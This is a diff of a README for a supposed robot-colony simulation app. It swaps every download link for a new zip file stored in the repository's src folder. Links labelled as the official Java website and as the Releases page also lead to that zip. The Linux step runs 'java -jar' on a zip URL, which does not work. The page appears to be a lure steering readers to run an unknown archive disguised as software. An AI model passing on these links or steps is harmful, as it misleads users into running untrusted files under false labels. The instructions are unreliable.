@@ -6,16 +6,16 @@ Welcome to **RobotColonyExplorerSimulation**! This application lets you dive int
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip%https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip)](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip)
+[![Download the Latest Release](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip%https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip)](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip)
 
-To get started, you'll need to download the application. Click the button above or visit the following link to access the Releases page: [Download Here](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip).
+To get started, you'll need to download the application. Click the button above or visit the following link to access the Releases page: [Download Here](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip).
 
 ## 📋 System Requirements
 
 Before you install the application, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10, macOS 10.12 or newer, or any recent Linux distribution.
-- **Java Version:** JDK 8 or newer installed. You can download it from the official [Java website](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip).
+- **Java Version:** JDK 8 or newer installed. You can download it from the official [Java website](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip).
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** At least 200 MB of free disk space.
 
@@ -30,12 +30,12 @@ Before you install the application, make sure your system meets the following re
 ## 🛠️ Installation Steps
 
 1. **Download the Application**
-   - Visit the Releases page: [Download Here](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip).
+   - Visit the Releases page: [Download Here](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip).
    - Choose the latest release that suits your operating system.
    - Click on the file and download it to your computer.
 
 2. **Install Java**
-   - Make sure you have Java installed on your computer. If not, download and install the latest version from the official [Java website](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip).
+   - Make sure you have Java installed on your computer. If not, download and install the latest version from the official [Java website](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip).
 
 3. **Run the Application**
    - Navigate to the folder where you downloaded the file.
@@ -43,7 +43,7 @@ Before you install the application, make sure your system meets the following re
    - For macOS, double-click the `.jar` file to launch it. If it doesn’t open, right-click and select “Open.”
    - For Linux users, open a terminal, navigate to the location of the `.jar` file, and run the command:
      ```
-     java -jar https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip
+     java -jar https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip
      ```
 
 ## 🎮 Using the Application
@@ -76,6 +76,6 @@ For further questions or help, consider the following resources:
 
 ## 📥 Download & Install the Application Again
 
-To download the application again, follow the link: [Download Here](https://raw.githubusercontent.com/AngelJulio1331/RobotColonyExplorerSimulation/master/src/Explorer-Simulation-Robot-Colony-1.7.zip).
+To download the application again, follow the link: [Download Here](https://github.com/AngelJulio1331/RobotColonyExplorerSimulation/raw/refs/heads/master/src/Colony-Explorer-Robot-Simulation-2.8.zip).
 
 With this guide, you should be able to download, install, and enjoy the RobotColonyExplorerSimulation without any hassle. Have fun exploring the capabilities of autonomous robots!
